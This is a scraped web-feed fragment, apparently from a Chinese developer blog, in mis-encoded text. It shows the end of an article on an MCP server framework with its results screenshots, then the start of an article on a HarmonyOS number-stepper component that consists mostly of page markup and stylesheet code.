<p>å…¶å®æ•´ä¸ªæ¡†æ¶åˆ°è¿™å…³é”®çš„ä»£ç å°±è¯´å®Œäº†ã€‚å‰©ä¸‹xingyunçš„å°±æ˜¯åœ¨è¡Œäº‘å¹³å°éƒ¨ç½²å’Œå¯åŠ¨éœ€è¦çš„è„šæœ¬ï¼Œè¿™é‡Œå°±ä¸ä»‹ç»äº†</p>
<p>ï»¿</p>
<h2 data-id="heading-5">æˆæœå±•ç¤º</h2>
<p>1.stdio - å‘å¸ƒäº†ä¾èµ–åŒ…ï¼Œå¹¶ç”¨joycodeæˆåŠŸè”é€š</p>
<p>ï»¿<a href="https://link.juejin.cn?target=https%3A%2F%2Fnpm.m.jd.com%2Fpackage%2F%40jd%2Fdemo-mcp-server" target="_blank" title="https://npm.m.jd.com/package/@jd/demo-mcp-server" ref="nofollow noopener noreferrer">npm.m.jd.com/package/@jdâ€¦</a></p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9cb4ed9288f4487955473f6263efdbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=bKoQRbfKOBJbn32B1oc%2B97GQosU%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p>2.streamableHttp - joycodeæˆåŠŸè”é€šå¹¶ä¸”å¯ä»¥è¿è¡Œ</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47fce5ada64429c95e69c6597fc5696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=ViBE7J%2BGIxuuoov%2FBLibMU9RC6s%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62b6a24de7e2462c8272790aaf7f5dc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=ilvg5%2FGO6kt036zC86ep7k0GMBg%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p>3.sse - autobotsæ”¯æŒsseæ¨¡å¼ï¼Œç”¨è¿™ä¸ªæ¡†æ¶å¼€å‘äº†åœ¨ä¸šåŠ¡ä¸­ä½¿ç”¨çš„ æƒé™æ‹¦æˆªMCP,å¹¶æˆåŠŸåœ¨autobotså¼•å…¥</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/526475363b124af989347ad39e5701f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=EzHQP7aiJgSrbOounoWvrYzRrcc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb4a980fd25441e9cad68d9f8781434~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=uZ1tb%2F%2F5ftQyrm6NlHRcDcHqHVw%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¸¿è’™å¼€å‘ï¼šä¸€ä¸ªç®€å•çš„æ•°å­—åŠ å‡æ¡†ç»„ä»¶]]></title>    <link>https://juejin.cn/post/7597641580104679478</link>    <guid>https://juejin.cn/post/7597641580104679478</guid>    <pubDate>2026-01-21T10:19:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597641580104679478" data-draft-id="7597596202025189418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¸¿è’™å¼€å‘ï¼šä¸€ä¸ªç®€å•çš„æ•°å­—åŠ å‡æ¡†ç»„ä»¶"/> <meta itemprop="keywords" content="HarmonyOS,Android,iOS"/> <meta itemprop="datePublished" content="2026-01-21T10:19:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜ä¸€é¸£"/> <meta itemprop="url" content="https://juejin.cn/user/1398234520239095"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¸¿è’™å¼€å‘ï¼šä¸€ä¸ªç®€å•çš„æ•°å­—åŠ å‡æ¡†ç»„ä»¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234520239095/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜ä¸€é¸£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:19:24.000Z" title="Wed Jan 21 2026 10:19:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body 